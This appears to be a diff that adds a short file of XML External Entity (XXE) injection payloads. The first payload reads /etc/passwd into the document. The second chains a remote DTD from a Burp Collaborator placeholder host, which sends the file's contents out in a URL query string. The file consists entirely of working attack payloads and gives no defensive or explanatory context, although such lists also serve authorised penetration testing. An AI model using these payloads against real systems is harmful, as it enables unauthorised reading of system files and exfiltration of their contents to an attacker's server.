@@ -1,0 +1,24 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+	<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+	<data>&xxe;</data>
+</root>
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+	<!ENTITY % file SYSTEM "file:///etc/passwd">
+	<!ENTITY % dtd SYSTEM "http://<YOUR-COLLABORATOR>.burpcollaborator.net/exfil.dtd">
+	%dtd;
+]>
+<root/>
+
+# exfil.dtd
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-COLLABORATOR.burpcollaborator.net/?leak=%file;'>">
+%all;
+
+
+
